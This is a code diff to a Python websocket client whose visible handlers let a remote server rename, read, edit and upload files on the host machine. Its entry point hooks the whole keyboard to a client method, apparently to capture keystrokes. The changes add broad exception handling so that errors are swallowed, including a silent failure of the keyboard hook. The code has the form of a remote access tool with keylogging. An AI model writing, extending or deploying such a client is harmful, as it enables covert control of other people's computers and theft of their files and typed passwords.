@@ -47,29 +47,42 @@ class File:
 
     @staticmethod
     def rename(src, dst):
-        os.rename(src, dst)
-        return {"msg": "success"}
+        try:
+            os.rename(src, dst)
+            return {"msg": "success"}
+        except Exception as e:
+            return {"msg": e.__str__()}
 
     @staticmethod
     def download(path):
-        with open(path, 'rb') as f:
-            return f.read()
+        try:
+            with open(path, 'rb') as f:
+                return f.read()
+        except Exception as e:
+            return None
 
     @staticmethod
-    def edit(path, data):
-        if data:
-            with open(path, "w", encoding="utf8") as f:
-                f.write(data)
+    def edit(path: str, data: str):
+        try:
+            if data:
+                with open(path, "w") as f:
+                    f.write(data)
                 return {"msg": "success"}
-        else:
-            with open(path, "r", encoding="utf8") as f:
-                return {"msg": "success", "data": f.read()}
+            else:
+                with open(path, "r") as f:
+                    _data = f.read()
+                return {"msg": "success", "data": _data}
+        except Exception as e:
+            return {"msg": e.__str__()}
 
     @staticmethod
     def save_file(path: str, data: bytes):
-        with open(path, 'wb') as f:
-            f.write(data)
-        return {"msg": "success"}
+        try:
+            with open(path, 'wb') as f:
+                f.write(data)
+            return {"msg": "success"}
+        except Exception as e:
+            return {"msg": e.__str__()}
 
     @staticmethod
     def dir(path):
@@ -135,7 +148,8 @@ class Client:
             self.send(data_bean.json())
         if msg.get("type") == "upload":
             raw_path = msg["data"]["path"]
-            data_bean.raw = File.save_file(raw_path, base64.b64decode(msg["data"]["data"]))
+            raw_filename = msg["data"]["filename"]
+            data_bean.raw = File.save_file(os.path.join(raw_path, raw_filename), base64.b64decode(msg["data"]["data"]))
             self.send(data_bean.json())
         if msg.get("type") == "edit":
             raw_path = msg["data"]["path"]
@@ -210,5 +224,8 @@ class Client:
 if __name__ == '__main__':
     WS_URL = "ws://127.0.0.1:5000/ping"
     client = Client(WS_URL)
-    keyboard.hook(client.key)
+    try:
+        keyboard.hook(client.key)
+    except Exception as e:
+        pass
     client.ws.run_forever(ping_interval=10)
